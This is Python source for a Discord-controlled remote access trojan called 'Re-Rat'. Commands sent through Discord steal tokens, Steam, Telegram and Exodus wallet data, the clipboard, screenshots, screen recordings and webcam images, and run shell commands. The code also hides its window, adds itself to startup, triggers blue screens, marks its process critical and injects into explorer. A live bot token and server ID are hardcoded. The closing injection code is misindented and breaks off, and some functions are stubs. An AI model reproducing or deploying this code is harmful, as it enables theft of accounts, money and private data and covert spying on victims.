from __future__ import print_function
import discord
from discord.ext import commands
from discord.utils import get
import socket 
import os
import random 
import string
import shutil
from PIL import ImageGrab
import pyautogui
import urllib
from urllib.request import urlopen
import base64
import json
import win32crypt
import requests
from Crypto.Cipher import AES
import tkinter.messagebox
from re import findall
import subprocess
import tkinter as tk
import tkinter.messagebox
import tkinter
import ctypes
import zipfile
import sys
import wave
import cv2
import datetime
import numpy as np
import asyncio
import platform
import aiohttp
import hashlib
import psutil

import ctypes
import sys
import win32con

sessions = {}

sessions = {}
msg = "no debbuging here :)"
temp = os.getenv("temp")
temp_path = os.path.join(temp, ''.join(random.choices(
    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=10)))
os.mkdir(temp_path)
TOKEN = 'MTIyMTQ1ODQzMTg5OTA3ODgxNg.GMq_NP.UPNgmdaTK9Y_hSW5ZklwORoqp5WZdJGsFWAzHM'
tokens_channel_id = "1221517505432911922"

intents = discord.Intents.all()
bot = commands.Bot(command_prefix='!', intents=intents, help_command=None)
validkittykeys = {}  # Store valid keys here
config = {
    'token': "%MTIyMTQ1ODQzMTg5OTA3ODgxNg.GMq_NP.UPNgmdaTK9Y_hSW5ZklwORoqp5WZdJGsFWAzHM%",
    'server_id': '1221458338747781160'
}

@bot.event
async def on_ready():

    windkittyuserpcname1 = socket.gethostname()
    guild = discord.utils.get(bot.guilds, id=int(config['server_id']))

    if guild:
        channel_name = f"Re-Rat-{windkittyuserpcname1}"
        channel = discord.utils.get(guild.channels, name=channel_name)

        if not channel:
            channel = await guild.create_text_channel(channel_name)

        key = genwindkittykey()
        validkittykeys[key] = bot.user.id
        sumofchannels = sum(len(guild.channels) for guild in bot.guilds)

        ratmonitor = discord.Game(f"Rat is connect to over {sumofchannels} Computers")
        await bot.change_presence(activity=ratmonitor)
        embed = discord.Embed(title="Re-Rat", description=f"Connected to: {windkittyuserpcname1}\nYour Re-Rat key is: `{key}`", color=discord.Color.red())
        embed.set_footer(text='Re-Rat made by Maltey, use !help for commands.')
        embed.set_thumbnail(url='')
        await channel.send(embed=embed)
        

def getdcinfo():
    all_tokens = []
    appdata = os.getenv("LOCALAPPDATA")
    roaming = os.getenv("APPDATA")
    encrypt_regex = r"dQw4w9WgXcQ:[^\"]*"
    normal_regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
    baseurl = "https://discord.com/api/v9/users/@me"
    tokens = []
    ids = []

    paths = {
        "Discord": roaming + "\\discord\\Local Storage\\leveldb\\",
        "Discord Canary": roaming + "\\discordcanary\\Local Storage\\leveldb\\",
        "Lightcord": roaming + "\\Lightcord\\Local Storage\\leveldb\\",
        "Discord PTB": roaming + "\\discordptb\\Local Storage\\leveldb\\",
        "Opera": roaming + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\",
        "Opera GX": roaming + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\",
        "Amigo": appdata + "\\Amigo\\User Data\\Local Storage\\leveldb\\",
        "Torch": appdata + "\\Torch\\User Data\\Local Storage\\leveldb\\",
        "Kometa": appdata + "\\Kometa\\User Data\\Local Storage\\leveldb\\",
        "Orbitum": appdata + "\\Orbitum\\User Data\\Local Storage\\leveldb\\",
        "CentBrowser": appdata + "\\CentBrowser\\User Data\\Local Storage\\leveldb\\",
        "7Star": appdata + "\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\",
        "Sputnik": appdata + "\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\",
        "Vivaldi": appdata + "\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\",
        "Chrome SxS": appdata + "\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\",
        "Chrome": appdata + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\",
        "Chrome1": appdata + "\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\",
        "Chrome2": appdata + "\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\",
        "Chrome3": appdata + "\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\",
        "Chrome4": appdata + "\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\",
        "Chrome5": appdata + "\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\",
        "Epic Privacy Browser": appdata + "\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\",
        "Microsoft Edge": appdata + "\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\",
        "Uran": appdata + "\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\",
        "Yandex": appdata + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\",
        "Brave": appdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\",
        "Iridium": appdata + "\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\",
    }

def geniojefwfjewofkey():
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(16))

def zipkitty(kittyput, kittynameuuwu):
    shutil.make_archive(kittynameuuwu, 'zip', kittyput)

async def validate_key(ctx, key):
    if not validkittykeys:
        await ctx.send(":warning: Bot is still initializing. Please wait and try again.")
        return False

    if key not in validkittykeys:
        return False

    return True

@bot.command(name='help')
@commands.cooldown(1, 5, commands.BucketType.user)
async def help_command(ctx):
    embed = discord.Embed(title='Re-Rat-v1 Commands',description='List of available commands for Re-Rat.',color=discord.Color.red())

    cmds = [
        {'name': 'bsod', 'description': 'Trigger a Blue Screen of Death (BSOD).', 'example': '!bsod (your key)'},
        {'name': 'screenshot', 'description': 'Capture a screenshot of the host machine.', 'example': '!screenshot (your key)'},
        {'name': 'clipboard', 'description': 'Steal clipboard info.', 'example': '.clipboard (your key)'},
        {'name': 'history', 'description': 'Steal browser history.', 'example': '.history (your key)'},
        {'name': 'steam', 'description': 'Steal Steam session information.', 'example': '!steam (your key)'},
        {'name': 'exodus', 'description': 'Steal a Exodus wallet.', 'example': '.exodus (your key)'},
        {'name': 'tasklist', 'description': 'Get a list of running tasks on the host machine.', 'example': '.tasklist (your key)'},
        {'name': 'shell', 'description': 'Execute a shell command on the host machine.', 'example': '.shell (your key) <command>'},
        {'name': 'exit', 'description': 'Exits Discord Bot.', 'example': '.exit (your key)'},
        {'name': 'telegram', 'description': 'Telegram Session Files.', 'example': '.telegram (your key)'},
        {'name': 'disabletaskmgr', 'description': 'disable taskmgr.', 'example': '!disabletaskmgr (your key)'},
        {'name': 'enabletaskmgr', 'description': 'enable taskmgr.', 'example': '.enabletaskmgr (your key)'},
        {'name': 'get_ip', 'description': 'Get the ip.', 'example': '!get_ip (your key)'},
        {'name': 'grabdiscord', 'description': 'Get the discord token.', 'example': '!grabdiscord (your key)'},
        {'name': 'websiter', 'description': 'Open a Website.', 'example': '!website (your key) (your website)'},
        {'name': 'record', 'description': 'Records the screen for 30 seconds.', 'example': '!Record (your key)'},
        {'name': 'webcam', 'description': 'Make a pic whit the webcam.', 'example': '!webcam (your key)'},
        {'name': 'usage', 'description': 'see the usage of the pc.', 'example': '!usage (your key)'},
        {'name': 'critstub', 'description': 'Makes the stub to a windows process.', 'example': '!critstub (your key)'},
    ]



    for cmdinf in cmds:
        embed.add_field(name=f'!{cmdinf["name"]}', value=f'{cmdinf["description"]} Example: `{cmdinf["example"]}`', inline=False)

    embed.set_footer(text='Re-Rat made by Maltey.')
    embed.set_thumbnail(url='https://raw.githubusercontent.com/iojefwfjewof/iojefwfjewof-Rat/main/img/iojefwfjewofLogo.png')

    await ctx.send(embed=embed)

class User32:
    @staticmethod
    def hidewind(hwnd, n_cmd_show):
        return ctypes.windll.user32.ShowWindow(hwnd, n_cmd_show)

class Kernel32:
    @staticmethod
    def get_console_window():
        return ctypes.windll.kernel32.GetConsoleWindow()

kitty_hide = 0
kitty_wind = Kernel32.get_console_window()
User32.hidewind(kitty_wind, kitty_hide)

@bot.command(name='screenshot')
@commands.cooldown(1, 5, commands.BucketType.user)
async def delamsiskrinshot(ctx, key=None):
    if not key or not await validate_key(ctx, key):
        return
    embed = discord.Embed(title=':warning: Please wait!', description="Command was executed! please wait, screenshot is being sent.", color=discord.Color.yellow())
    screenshot = ImageGrab.grab()
    # Save the image as screenshot.png
    screenshot.save('screenshot.png')
    await ctx.send(file=discord.File('screenshot.png'))

@bot.command()
async def get_ip(ctx, key=None):
    if not key or not await validate_key(ctx, key):
        return
    """Get the user's IP address."""
    ip_address = urlopen('https://ident.me').read().decode('utf-8')
    await ctx.send(f'```IP address: {ip_address} [ident.me]```')
    await ctx.send('IP address sent to the designated channel.')

def genwindkittykey():
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(16))


async def validate_key(ctx, key):
    if not validkittykeys:
        await ctx.send(":warning: Bot is still initializing. Please wait and try again.")
        return False

    if key not in validkittykeys:
        return False

    return True

def token_grab():
            LOCAL = os.getenv("LOCALAPPDATA")
            ROAMING = os.getenv("APPDATA")
            PATHS = [
                ROAMING + "\\Discord",
                ROAMING + "\\discordcanary",
                ROAMING + "\\discordptb",
                LOCAL + "\\Google\\Chrome\\User Data\\Default",
                LOCAL + "\\Google\\Chrome\\User Data\\Profile 1",
                LOCAL + "\\Google\\Chrome\\User Data\\Profile 2",
                LOCAL + "\\Google\\Chrome\\User Data\\Profile 3",
                LOCAL + "\\Google\\Chrome\\User Data\\Profile 4",
                LOCAL + "\\Google\\Chrome\\User Data\\Profile 5",
                ROAMING + "\\Opera Software\\Opera Stable",
                LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
                LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default",
                ROAMING + "\\Opera Software\\Opera GX Stable\\"

            ]

            for path in reversed(PATHS):
                if not os.path.exists(path):
                    PATHS.remove(path)

            regex1 = "[\\w-]{24}\.[\\w-]{6}\\.[\\w-]{27}"
            regex2 = r"mfa\\.[\\w-]{84}"
            encrypted_regex = "dQw4w9WgXcQ:[^.*\\['(.*)'\\].*$]{120}"

            def getheaders(token=None, content_type="application/json"):
                headers = {
                    "Content-Type": content_type,
                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
                }
                if token:
                    headers.update({"Authorization": token})
                return headers

            def decrypt_payload(cipher, payload):
                return cipher.decrypt(payload)

            def generate_cipher(aes_key, iv):
                return AES.new(aes_key, AES.MODE_GCM, iv)

            def decrypt_token(buff, master_key):
                try:
                    iv = buff[3:15]
                    payload = buff[15:]
                    cipher = generate_cipher(master_key, iv)
                    decrypted_pass = decrypt_payload(cipher, payload)
                    decrypted_pass = decrypted_pass[:-16].decode()
                    return decrypted_pass
                except Exception:
                    return "Couldn't decrypt token"

            def get_master_key(path):
                with open(path, "r", encoding="utf-8") as f:
                    local_state = f.read()
                local_state = json.loads(local_state)

                master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                master_key = master_key[5:]
                master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
                return master_key

            def gettokens(path):
                path1=path
                path += "\\Local Storage\\leveldb"
                tokens = []
                try:
                    if not "discord" in path.lower():
                        for file_name in os.listdir(path):
                            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                                continue
                            for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                                for token in findall(regex1, line):
                                    try:
                                        r = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(token))
                                        if r.status_code == 200:
                                            if token in tokens:
                                                continue
                                    except Exception:
                                        continue
                                    tokens.append(token)
                                for token in findall(regex2, line):
                                    print(token)
                                    try:
                                        r = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(token))
                                        if r.status_code == 200:
                                            if token in tokens:
                                                continue
                                    except Exception:
                                        continue
                                    tokens.append(token)
                    else:
                        for file_name in os.listdir(path):
                            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                                continue
                            for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                                for y in findall(encrypted_regex, line):
                                    token = decrypt_token(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), get_master_key(path1 + '\\Local State'))
                                    try:
                                        r = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(token))
                                        if r.status_code == 200:
                                            if token in tokens:
                                                continue
                                            tokens.append(token)
                                            
                                    except:
                                        continue
                    return tokens
                except Exception as e:
                    return []
            all_tokens=[]
            for path_grab in PATHS:
                if os.path.exists(path_grab):
                    for token in gettokens(path_grab):
                        all_tokens.append(f"`{path_grab}` - **{token}**")
            return str(all_tokens).replace("[", "").replace("]", "").replace("'", "").replace(",", "")

@bot.command()
async def grabdiscord(ctx, key=None) :
        if not key or not await validate_key(ctx, key):
         return
        postchannel = bot.get_channel(int(tokens_channel_id))
        await ctx.send(f":skull_crossbones: Searching for **{os.getlogin()}**'s account tokens...")
        await postchannel.send(f"{ctx.author.mention} Account tokens for **{os.getlogin()}** : \n\n{token_grab()}")
        await ctx.send(f":white_check_mark: **{os.getlogin()}**'s account tokens have been sent in <#{tokens_channel_id}>")

def disable_task_manager():
    registry_path = "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
    registry_name = "DisableTaskMgr"
    value = 1


def enable_task_manager():
    registry_path = "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
    registry_name = "DisableTaskMgr"
    value = 0


@bot.command()
async def disabletaskmgr(ctx, key=None):
        if not key or not await validate_key(ctx, key):
         return
        value = disable_task_manager()
        if value == True:
            await ctx.send(f"Task manager has been disabled for **{os.getlogin()}**")
        else:
            await ctx.send("Insufficient permissions.")

@bot.command()
async def enabletaskmgr(ctx, key=None):
        if not key or not await validate_key(ctx, key):
         return
        value = enable_task_manager()
        if value == True:
            await ctx.send(f"Task manager has been enabled for **{os.getlogin()}**")
        else:
            await ctx.send("Insufficient permissions.")

@bot.command()
async def tasklist(ctx, key=None):
        if not key or not await validate_key(ctx, key):
         return
        if 1==1:
            result = subprocess.getoutput("tasklist")
            numb = len(result)
            if numb < 1:
                await ctx.send(f"Error displaying active tasks for **{os.getlogin()}**")
            elif numb > 1990:
                temp = (os.getenv('TEMP'))
                if os.path.isfile(temp + r"\olist.txt"):
                    os.system(r"del %temp%\olist.txt /f")
                f1 = open(temp + r"\olist.txt", 'a')
                f1.write(result)
                f1.close()
                file = discord.File(temp + r"\olist.txt", filename="olist.txt")
                await ctx.send(f"Active tasks for **{os.getlogin()}** :", file=file)
            else:
                await ctx.send(f"Active tasks for **{os.getlogin()}** : " + result) 

@bot.command()
async def taskkill(ctx, *, proc):
        kilproc = r"taskkill /IM"  + ' "' + proc + '" ' + r"/f" 
        os.system(kilproc)
        process_name = proc
        await ctx.send(f"Killed the **{proc}** task for **{os.getlogin()}**")
        call = 'TASKLIST', '/FI', 'imagename eq %s' % process_name
        output = subprocess.check_output(call).decode()
        last_line = output.strip().split('\r\n')[-1]
        done = (last_line.lower().startswith(process_name.lower()))
        if done == False:
            await ctx.send(f"Killed the **{proc}** task for **{os.getlogin()}**")
        elif done == True:
            await ctx.send(f"Error killing the **{proc}** task  for **{os.getlogin()}**")

@bot.command()
@commands.cooldown(1, 5, commands.BucketType.user)
async def shell(ctx, key=None, *, command: str):
    if not key or not await validate_key(ctx, key):
        return
    if key:
        try:
            subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
            embed = discord.Embed(title='Shell Info', description='Executed successfully')
            embed.set_footer(text='ReRat Made by Maltey.')
            embed.set_thumbnail(url='https://raw.githubusercontent.com/iojefwfjewof/iojefwfjewof-Rat/main/img/iojefwfjewofLogo.png')
            await ctx.send(embed=embed)
        except subprocess.CalledProcessError as e:
            pass
    else:
        pass


@bot.command()
@commands.cooldown(1, 5, commands.BucketType.user)
async def clipboard(ctx, key=None):
    if not key or not await validate_key(ctx, key):
        return
    try:
        
        result = subprocess.check_output(['powershell', 'Get-Clipboard'], text=True)

        embed = discord.Embed(title='Clipboard Info', description=result)
        embed.set_footer(text='Re-Rat made by Maltey.')
        embed.set_thumbnail(url='https://raw.githubusercontent.com/iojefwfjewof/iojefwfjewof-Rat/main/img/iojefwfjewofLogo.png')
        await ctx.send(embed=embed)

    except Exception as e:
        embed = discord.Embed(title='Error', description=f"An error occurred: {e}, so basically command didnt execute", color=discord.Color.red())
        await ctx.send(embed=embed)

ntdll = ctypes.WinDLL('ntdll.dll')

def rtl_adjust_privilege(privilege, enable_privilege, thread_privilege, previous_value):
    return ntdll.RtlAdjustPrivilege(privilege, enable_privilege, thread_privilege, ctypes.byref(previous_value))

def nt_raise_hard_error(error_status, number_of_parameters, unicode_string_parameter_mask, parameters, valid_response_option, response):
    return ntdll.NtRaiseHardError(error_status, number_of_parameters, unicode_string_parameter_mask, parameters, valid_response_option, ctypes.byref(response))

@bot.command(name='bsod')
@commands.cooldown(1, 5, commands.BucketType.user)
async def bsod(ctx, key=None):
    if not key or not await validate_key(ctx, key):
        return
    
    t1 = ctypes.c_bool()
    t2 = ctypes.c_uint()

    rtl_adjust_privilege(19, True, False, t1)
    nt_raise_hard_error(0xc0000022, 0, 0, None, 6, t2)
    embed = discord.Embed(title='BSOD', description='Sucessfully Executed Command.')
    embed.set_footer(text='ReRat-Rat made by Maltey.')

    embed.set_thumbnail(url='https://raw.githubusercontent.com/iojefwfjewof/iojefwfjewof-Rat/main/img/iojefwfjewofLogo.png')

    await ctx.send(embed=embed)

@bot.command(name='exit')
async def exit_command(ctx, key=None):
    if not await validate_key(ctx, key):
           return

    await ctx.send("Shutting down... Bye!")
    os.system('cls')
    await bot.close()

@bot.command()
@commands.cooldown(1, 5, commands.BucketType.user)
async def steam(ctx, key=None):
    if not key or not await validate_key(ctx, key):
        return
    if key:
        embed = discord.Embed(title=':fire: Searching...', description="!help for more", color=discord.Color.red())
    await ctx.send(embed=embed)
    v1 = ""
    if os.path.exists(os.environ["PROGRAMFILES(X86)"] + "\\steam"):
        v1 = os.environ["PROGRAMFILES(X86)"] + "\\steam"
        v2 = []
        v3 = ""
        for file in os.listdir(v1):
            if file[:4] == "ssfn":
                v2.append(v1 + f"\\{file}")

        def v4(path, path1, steam_session):
            for root, dirs, file_name in os.walk(path):
                for file in file_name:
                    steam_session.write(root + "\\" + file)
            for file2 in path1:
                steam_session.write(file2)

        if os.path.exists(v1 + "\\config"):
            with zipfile.ZipFile(f"{os.environ['TEMP']}\\steam_session.zip", 'w', zipfile.ZIP_DEFLATED) as zp:
                v4(v1 + "\\config", v2, zp)

            await ctx.send("Steam Session:", file=discord.File(f"{os.environ['TEMP']}\\steam_session.zip"))

            try:
                os.remove(f"{os.environ['TEMP']}\\steam_session.zip")
            except:
                pass

@bot.command()
@commands.cooldown(1, 5, commands.BucketType.user)
async def exodus(ctx, key=None):
    if not key or not await validate_key(ctx, key):
        return
    if key:
     user = os.path.expanduser("~")
    embed = discord.Embed(title=':warning: Please wait!', description="Command was executed! please wait, before using new one.", color=discord.Color.yellow())
    await ctx.send(embed=embed)
    v1 = user + "\\AppData\\Roaming\\Exodus"
    v2 = user + "\\AppData\\Local\\Temp\\Exodus"
    v3 = user + "\\AppData\\Local\\Temp\\Exodus.zip"

    if os.path.exists(v2):
        shutil.rmtree(v2)

    if os.path.exists(v1):
        shutil.copytree(v1, v2)
        shutil.make_archive(v2, "zip", v2)

        await ctx.send(file=discord.File(v3))

        try:
            os.remove(v3)
            os.remove(v2)
        except Exception as e:
            print(f"Error: {e}")

@bot.command()
async def startup(ctx, key=None):
    if not key or not await validate_key(ctx, key):
        return
    if key:
        autostart_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
        shutil.copy(" ".join(sys.argv), os.path.join(autostart_folder, "update.exe"))
        await ctx.send("Startup added :skull: :heart_eyes:")

@bot.command(name='telegram')
@commands.cooldown(1, 5, commands.BucketType.user)
async def telegram_command(ctx, key=None):
    if not await validate_key(ctx, key):
        return
    embed = discord.Embed(title=':fire: Please wait!', description="it might take a minute or two.", color=discord.Color.orange())
    await ctx.send(embed=embed)
    tele = 'Telegram'
    os.system(f'taskkill /f /im {tele}.exe')
    os.system('echo Maltey was here >> %userprofile%\\AppData\\Local\\Temp\\readme.txt ')
    os.system('cls')
    pth = os.path.join(os.getenv('userprofile'), 'AppData', 'Roaming', 'Telegram Desktop', 'tdata')
    des = os.path.join(os.getenv('Temp'), 'WindKitty', 'Socials', 'Telegram')
    exclde = ["_*.config", "dumps", "tdummy", "emoji", "user_data", "user_data#2", "user_data#3", "user_data#4", "user_data#5", "user_data#6", "*.json", "webview"]

    os.makedirs(des, exist_ok=True)

    for root, dirs, files in os.walk(pth, topdown=True):
        dirs[:] = [d for d in dirs if not any(exclude in d for exclude in exclde)]
        for file in files:
            if not any(exclude in file for exclude in exclde):
                srcfil3 = os.path.join(root, file)
                relpath = os.path.relpath(srcfil3, pth)
                desfil3 = os.path.join(des, relpath)
                os.makedirs(os.path.dirname(desfil3), exist_ok=True)
                shutil.copy2(srcfil3, desfil3)

    kittyneme = os.path.join(os.getenv('Temp'), 'Telegram.zip')
    with zipfile.ZipFile(kittyneme, 'w') as zipf:
        for root, _, files in os.walk(des):
            for file in files:
                fleepathkitty = os.path.join(root, file)
                relpeth = os.path.relpath(fleepathkitty, des)
                zipf.write(fleepathkitty, relpeth)

    embed = discord.Embed(description='telegram got you...')
    await ctx.send(embed=embed, file=discord.File(kittyneme))
    os.remove(kittyneme)

@bot.command()
async def shutdown(ctx, key=None):
        if not key or not await validate_key(ctx, key):
            return
            if key:
             await ctx.send(f"**{os.getlogin()}**'s PC has been shut down.")
        os.system("shutdown /p")

@bot.command(name='website')
@commands.cooldown(1, 5, commands.BucketType.user)
async def opnsite(ctx, key, wburi):
    if not await validate_key(ctx, key):
        return
    os.system(f'start {wburi}')
    embed = discord.Embed(description=f'Opened {wburi} successfully...')
    await ctx.send(embed=embed)

@bot.command(name="exe")
@commands.cooldown(1, 5, commands.BucketType.user)
async def exe(ctx):
        window = tkinter.Tk()
        window.wm_withdraw()
        tkinter.messagebox.showerror(title="Error 404 no debugging allowed.", message=msg)
        window.destroy()
        return None

@bot.command(name="hide")
async def hide(ctx, key=None):
    if not await validate_key(ctx, key):
        return
    import inspect
    try:
        thefile = inspect.getframeinfo(inspect.currentframe()).filename
        os.system(f"attrib +h {thefile}")
        await ctx.channel.send("```The File Hided!```")

    except Exception as e:
        await ctx.channel.send(f"```Error :\n {e} ``` ")


@bot.command()
async def webcam(ctx, key=None):
        if not await validate_key(ctx, key):
            return
        cap = cv2.VideoCapture(0)

        if not cap.isOpened():
            await ctx.send("Failed")
            return

        ret, frame = cap.read()

        if not ret:
            await ctx.send("Failed.")
            return
        output = "webcam.jpg"
        cv2.imwrite(output, frame)
        await session.send("", file=discord.File(output))
        os.remove(output)
        cap.release()

session = []

@bot.command()
async def record(ctx, key=None):
        if not await validate_key(ctx, key):
            return
        await ctx.send("Recording started")

        start = datetime.datetime.now()
        duration = datetime.timedelta(seconds=30)
        frames = []

        while datetime.datetime.now() - start < duration:
            img = ImageGrab.grab()
            frames.append(cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR))

            await asyncio.sleep(0.1)

        height, width, _ = frames[0].shape
        outputf = "screen.mp4"
        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
        videow = cv2.VideoWriter(outputf, fourcc, 10, (width, height))

        for frame in frames:
            videow.write(frame)
        videow.release()

        await ctx.send("Recording completed")
        await ctx.send(file=discord.File(outputf))
        os.remove(outputf)

ram = psutil.virtual_memory()
total_ram = round(ram.total / (1024 ** 3), 2)
used_ram = round(ram.used / (1024 ** 3), 2)
ram_perc = ram.percent

@bot.command()
async def usage(ctx, key=None):
        if not await validate_key(ctx, key):
                return
        disku = psutil.disk_usage("/")
        totaldick = round(disku.total / (1024 ** 3), 2)
        useddick = round(disku.used / (1024 ** 3), 2)
        used_ram = round(ram.used / (1024 ** 3), 2)
        dickperc = disku.percent

        cpuperc = psutil.cpu_percent()

        embed = discord.Embed(title="System Usage", color=discord.Color.purple())
        embed.add_field(name="Disk", value=f"```{useddick} GB / {totaldick} GB ({dickperc}%)```", inline=False)
        embed.add_field(name="CPU", value=f"```{cpuperc}%```", inline=False)
        embed.add_field(name="RAM", value=f"```{used_ram} GB / {total_ram} GB ({ram_perc}%)```", inline=False)

        await ctx.send(embed=embed)

@bot.command()
async def critstub(ctx, key=None):
        if not await validate_key(ctx, key):
            return
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin == True:
            ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
            ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0) == 0
            await ctx.send(f"Successfully set the task to a critical process for **{os.getlogin()}**.")
        else:
            await ctx.send(f"Insufficient permissions to critproc for **{os.getlogin()}**")

@bot.command()
async def injectintoexplorer(ctx, key=None):
        if not await validate_key(ctx, key):
            return
        BOOL    = ctypes.c_int
DWORD   = ctypes.c_uint32
HANDLE  = ctypes.c_void_p
LONG    = ctypes.c_int32
NULL_T  = ctypes.c_void_p
SIZE_T  = ctypes.c_uint
TCHAR   = ctypes.c_char
USHORT  = ctypes.c_uint16
UCHAR   = ctypes.c_ubyte
ULONG   = ctypes.c_uint32

FALSE = ctypes.c_int(0)
TRUE = ctypes.c_int(1)
NULL = NULL_T(0)
INVALID_HANDLE_VALUE = ctypes.c_int64(-1)

TH32CS_SNAPPROCESS = 0x00000002
TH32CS_SNAPTHREAD = 0x00000004

DLL_KERNEL32 = ctypes.windll.kernel32


class PROCESSENTRY32(ctypes.Structure):
    _fields_ = [
        ('dwSize',              DWORD),
        ('cntUsage',            DWORD),
        ('th32ProcessID',       DWORD),
        ('th32DefaultHeapID',   NULL_T),
        ('th32ModuleID',        DWORD),
        ('cntThreads',          DWORD),
        ('th32ParentProcessID', DWORD),
        ('pcPriClassBase',      LONG),
        ('dwFlags',             DWORD),
        ('szExeFile',           TCHAR * win32con.MAX_PATH)
    ]


class THREADENTRY32(ctypes.Structure):
    _fields_ = [
        ('dwSize',              DWORD),
        ('cntUsage',            DWORD),
        ('th32ThreadID',        DWORD),
        ('th32OwnerProcessID',  DWORD),
        ('tpBasePri',           DWORD),
        ('tpDeltaPri',          DWORD),
        ('dwFlags',             DWORD)
    ]

CloseHandle                 = DLL_KERNEL32.CloseHandle
CreateToolhelp32Snapshot    = DLL_KERNEL32.CreateToolhelp32Snapshot
GetModuleHandle             = DLL_KERNEL32.GetModuleHandleA
GetProcAddress              = DLL_KERNEL32.GetProcAddress
OpenProcess                 = DLL_KERNEL32.OpenProcess
OpenThread                  = DLL_KERNEL32.OpenThread
Process32First              = DLL_KERNEL32.Process32First
Process32Next               = DLL_KERNEL32.Process32Next
QueueUserAPC                = DLL_KERNEL32.QueueUserAPC
Thread32First               = DLL_KERNEL32.Thread32First
Thread32Next                = DLL_KERNEL32.Thread32Next
VirtualAllocEx              = DLL_KERNEL32.VirtualAllocEx
VirtualFreeEx               = DLL_KERNEL32.VirtualFreeEx
WriteProcessMemory          = DLL_KERNEL32.WriteProcessMemory


def process_and_pid(hSnapshot):
    """Utility to retrieve processes and pids."""

    pe32 = PROCESSENTRY32()
    pe32.dwSize = ctypes.sizeof(PROCESSENTRY32)

    ntBool = Process32First(hSnapshot, ctypes.byref(pe32))
    if ntBool == win32con.TRUE:
        while True:
            yield pe32.szExeFile, pe32.th32ProcessID
            ntBool = Process32Next(hSnapshot, ctypes.byref(pe32))
            if ntBool == win32con.FALSE:
                break


def thread_in_process(hSnapshot, pid):
    """Utility to retrieve threads used by a process."""

    te32 = THREADENTRY32()
    te32.dwSize = ctypes.sizeof(THREADENTRY32)

    ntBool = Thread32First(hSnapshot, ctypes.byref(te32))
    if ntBool == win32con.TRUE:
        while True:
            if te32.th32OwnerProcessID == pid:
                yield te32.th32ThreadID
            ntBool = Thread32Next(hSnapshot, ctypes.byref(te32))
            if ntBool == win32con.FALSE:
                break


def do_the_apc_inject(pid, tids):
    """Inject APCs into the threads of process pid."""

    hProcess = OpenProcess(
        win32con.PROCESS_VM_WRITE | win32con.PROCESS_VM_OPERATION, FALSE, pid)

    if hProcess == INVALID_HANDLE_VALUE:
        return -1

    address = VirtualAllocEx(
        hProcess, None, 4096,
        win32con.MEM_COMMIT | win32con.MEM_RESERVE,
        win32con.PAGE_READWRITE)
    if not address:
        CloseHandle(hProcess)
        return -2

    buffer = 'You got pwned pid={0}'.format(pid).encode('ascii')
    ntBool = WriteProcessMemory(hProcess, address, buffer, len(buffer), None)
    if not ntBool:
        CloseHandle(hProcess)
        return -3

    injection_score = 0
    for tid in tids:
        hThread = OpenThread(win32con.THREAD_SET_CONTEXT, FALSE, tid)
        if not hThread:
            continue

        proc_address = DLL_KERNEL32.OutputDebugStringA
        ntResult = QueueUserAPC(proc_address, hThread, address)

        if ntResult:
            injection_score += 1
        CloseHandle(hThread)

    VirtualFreeEx(
        hProcess, address, 0, win32con.MEM_RELEASE | win32con.MEM_DECOMMIT)

    CloseHandle(hProcess)

    return injection_score


def main():
    """Utility core."""

    if len(sys.argv) != 2:
        sys.exit('Missing params [target_process]\n'
			'e.g.: uapc_inject.py explorer.exe')

    target_process = sys.argv[1].lower()

    hSnapshot = CreateToolhelp32Snapshot(
        TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0)
    if hSnapshot == INVALID_HANDLE_VALUE:
        sys.exit('CreateToolhelp32Snapshot returned invalid handle')

    for proc, pid in process_and_pid(hSnapshot):
        if proc.decode('utf-8').lower() == target_process:
            tids = []
